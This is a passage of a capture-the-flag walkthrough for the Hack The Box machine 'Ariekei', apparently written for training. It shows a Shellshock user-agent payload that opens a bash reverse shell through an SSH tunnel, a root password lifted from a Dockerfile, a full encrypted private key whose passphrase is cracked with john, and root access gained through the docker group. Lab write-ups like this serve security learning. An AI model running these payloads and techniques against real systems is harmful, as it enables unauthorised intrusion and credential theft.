```

Set up proxy to catch the reverse shell. We can use a dynamic port forward to open a port 6663 on the bastion host to receive the shell, and forward it back to us on port 6661:

Set up local netcat listener on 6662: 
```
ncat -lvp 6662 
Ncat: Version 7.01 ( https://nmap.org/ncat )
Ncat: Listening on :::6662
Ncat: Listening on 0.0.0.0:6662

```

Set up dynamic SSH port forward:
```
ssh -i bastion_key  -R 6663:172.24.0.253:6662 root@10.10.99.5 -p 1022 
```

Exploit Shellshock for reverse shell. Remote host should go bastion:6663 to make sure it forwards through the bastion, bypassing egress filtering.

```
proxychains curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/172.24.0.253/6663 0>&1;'" http://172.24.0.2/cgi-bin/stats
```

```
$ nc -lvp 6662
Listening on [0.0.0.0] (family 0, port 6662)
Connection from [127.0.0.1] port 6662 [tcp/*] accepted (family 2, sport 38186)
www-data@beehive:/usr/lib/cgi-bin$ id 
id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@beehive:/usr/lib/cgi-bin$ hostname
hostname
beehive.ariekei.htb
www-data@beehive:/usr/lib/cgi-bin$ 

```

Now we still aren't out of the container world yet, but if we attempt to browse any sensitive files in `/home/spanishdancer`, we get permissions denied. To elevate our privileges on the container, we can use the root password we know if set from the `Dockerfile`

```
www-data@beehive:/home/spanishdancer$ cat /common/containers/blog-test/Dockerfile
<ishdancer$ cat /common/containers/blog-test/Dockerfile                      
FROM internal_htb/docker-apache
RUN echo "root:Ib3!kTEvYw6*P7s" | chpasswd
RUN apt-get update 
RUN apt-get install python -y
RUN mkdir /common 

```

Start a pty shell with python, then su to root:

```
www-data@beehive:/home/spanishdancer$ cat /common/containers/blog-test/Dockerfile
           
FROM internal_htb/docker-apache
RUN echo "root:Ib3!kTEvYw6*P7s" | chpasswd
RUN apt-get update 
RUN apt-get install python -y
RUN mkdir /common 
www-data@beehive:/home/spanishdancer$ 

www-data@beehive:/home/spanishdancer$ python -c 'import pty; pty.spawn("/bin/sh")'
                  
$ su 
su 
Password: Ib3!kTEvYw6*P7s

root@beehive:/home/spanishdancer# 

root@beehive:/home/spanishdancer# 
```


Copy paste the ssh private key, but its password protected, so we'll have to crack it locally with ssh2john: 

```
root@beehive:/home/spanishdancer/.ssh# cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,C3EBD8120354A75E12588B11180E96D5

2UIvlsa0jCjxKXmQ4vVX6Ez0ak+6r5VuZFFoalVXvbZSLomIya4vYETv1Oq8EPeh
KHjq5wFdlYdOXqyJus7vFtB9nbCUrgH/a3og0/6e8TA46FuP1/sFMV67cdTlXfYI
Y4sGV/PS/uLm6/tcEpmGiVdcUJHpMECZvnx9aSa/kvuO5pNfdFvnQ4RVA8q/w6vN
p3pDI9CzdnkYmH5/+/QYFsvMk4t1HB5AKO5mRrc1x+QZBhtUDNVAaCu2mnZaSUhE
abZo0oMZHG8sETBJeQRnogPyAjwmAVFy5cDTLgag9HlFhb7MLgq0dgN+ytid9YA8
pqTtx8M98RDhVKqcVG3kzRFc/lJBFKa7YabTBaDoWryR0+6x+ywpaBGsUXEoz6hU
UvLWH134w8PGuR/Rja64s0ZojGYsnHIl05PIntvl9hinDNc0Y9QOmKde91NZFpcj
pDlNoISCc3ONnL4c7xgS5D2oOx+3l2MpxB+B9ua/UNJwccDdJUyoJEnRt59dH1g3
cXvb/zTEklwG/ZLed3hWUw/f71D9DZV+cnSlb9EBWHXvSJwqT1ycsvJRZTSRZeOF
Bh9auWqAHk2SZ61kcXOp+W91O2Wlni2MCeYjLuw6rLUHUcEnUq0zD9x6mRNLpzp3
IC8VFmW03ERheVM6Ilnr8HOcOQnPHgYM5iTM79X70kCWoibACDuEHz/nf6tuLGbv
N01CctfSE+JgoNIIdb4SHxTtbOvUtsayQmV8uqzHpCQ3FMfz6uRvl4ZVvNII/x8D
u+hRPtQ1690Eg9sWqu0Uo87/v6c/XJitNYzDUOmaivoIpL0RO6mu9AhXcBnqBu3h
oPSgeji9U7QJD64T8InvB7MchfaJb9W/VTECST3FzAFPhCe66ZRzRKZSgMwftTi5
hm17wPBuLjovOCM8QWp1i32IgcdrnZn2pBpt94v8/KMwdQyAOOVhkozBNS6Xza4P
18yUX3UiUEP9cmtz7bTRP5h5SlDzhprntaKRiFEHV5SS94Eri7Tylw4KBlkF8lSD
WZmJvAQc4FN+mhbaxagCadCf12+VVNrB3+vJKoUHgaRX+R4P8H3OTKwub1e69vnn
QhChPHmH9SrI2TNsP9NPT5geuTe0XPP3Og3TVzenG7DRrx4Age+0TrMShcMeJQ8D
s3kAiqHs5liGqTG96i1HeqkPms9dTC895Ke0jvIFkQgxPSB6y7oKi7VGs15vs1au
9T6xwBLJQSqMlPewvUUtvMQAdNu5eksupuqBMiJRUQvG9hD0jjXz8f5cCCdtu8NN
8Gu4jcZFmVvsbRCP8rQBKeqc/rqe0bhCtvuMhnl7rtyuIw2zAAqqluFs8zL6YrOw
lBLLZzo0vIfGXV42NBPgSJtc9XM3YSTjbdAk+yBNIK9GEVTbkO9GcMgVaBg5xt+6
uGE5dZmtyuGyD6lj1lKk8D7PbCHTBc9MMryKYnnWt7CuxFDV/Jp4fB+/DuPYL9YQ
8RrdIpShQKh189lo3dc6J00LmCUU5qEPLaM+AGFhpk99010rrZB/EHxmcI0ROh5T
1oSM+qvLUNfJKlvqdRQr50S1OjV+9WrmR0uEBNiNxt2PNZzY/Iv+p8uyU1+hOWcz
-----END RSA PRIVATE KEY-----

```


This passoword is cracked easily, and we see the key is protected with the word `purple1`: 

```
$ ssh2john spanishdancer_key > john_spanishdancer_key
$ john --wordlist=/usr/share/wordlists/rockyou.txt john_spanishdancer_key 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status

purple1          (spanishdancer_key)

1g 0:00:00:00 DONE (2017-09-26 15:30) 33.33g/s 22200p/s 22200c/s 22200C/s purple1
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```


## Host 

We can get a shell on the host now using spanishdancer's ssh key -

```
$ ssh -i spanishdancer_key spanishdancer@10.10.99.5
Enter passphrase for key 'spanishdancer_key': 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-87-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Tue Sep 26 14:08:39 2017 from 192.168.100.178

spanishdancer@ariekei:~$ cat user.txt 
<redact>


```

## PrivEsc

There are no kernel exploits publically available to root this box, and no other intended method. If you run `id -a`, you should see that spanishdancer has the `docker` group - 

```
spanishdancer@ariekei:~$ id -a
uid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker)

```

This is exploited trivially to gain some fake-root access to the box by mounting the root file system to a container. This is documented here: <https://fosterelli.co/privilege-escalation-via-docker.html>

See what images are available:

```
spanishdancer@ariekei:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
waf-template        latest              399c8876e9ae        4 days ago          628MB
bastion-template    latest              0df894ef4624        4 days ago          251MB
web-template        latest              b2a8f8d3ef38        4 days ago          185MB
bash                latest              a66dc6cea720        11 days ago         12.8MB
convert-template    latest              e74161aded79        16 months ago       418MB
```

The `bash` container image can be used to mount the root fs to the /opt directory in the container

```
spanishdancer@ariekei:~$ docker run -it -v /:/opt bash bash 
bash-4.4# ls -l /opt
total 85
drwxr-xr-x    2 root     root          4096 Sep 21 21:13 bin
drwxr-xr-x    4 root     root          1024 Sep 21 21:14 boot
drwxr-xr-x   20 root     root          4000 Sep 26 18:07 dev
drwxr-xr-x   91 root     root          4096 Sep 24 00:55 etc
drwxr-xr-x    3 root     root          4096 Sep 16 04:04 home
lrwxrwxrwx    1 root     root            32 Sep 16 04:00 initrd.img -> boot/initrd.img-4.4.0-87-generic
drwxr-xr-x   22 root     root          4096 Sep 16 04:02 lib
drwxr-xr-x    2 root     root          4096 Sep 16 03:59 lib64
drwx------    2 root     root         16384 Sep 16 03:59 lost+found
drwxr-xr-x    3 root     root          4096 Sep 16 03:59 media
drwxr-xr-x    2 root     root          4096 Aug  1 11:16 mnt
drwxr-xr-x    4 root     root          4096 Sep 23 18:45 opt
dr-xr-xr-x  152 root     root             0 Sep 26 18:07 proc
drwx------    2 root     root          4096 Sep 26 18:38 root
drwxr-xr-x   25 root     root           940 Sep 26 19:32 run
drwxr-xr-x    2 root     root         12288 Sep 21 21:22 sbin
drwxr-xr-x    2 root     root          4096 Apr 29 08:38 snap
drwxr-xr-x    2 root     root          4096 Aug  1 11:16 srv
dr-xr-xr-x   13 root     root             0 Sep 26 18:49 sys
drwxrwxrwt    8 root     root          4096 Sep 26 19:35 tmp
drwxr-xr-x   10 root     root          4096 Sep 16 03:59 usr
drwxr-xr-x   13 root     root          4096 Sep 16 04:02 var
lrwxrwxrwx    1 root     root            29 Sep 16 04:00 vmlinuz -> boot/vmlinuz-4.4.0-87-generic
bash-4.4# 
bash-4.4# cd /opt/root/
bash-4.4# cat root.txt
<redact>

```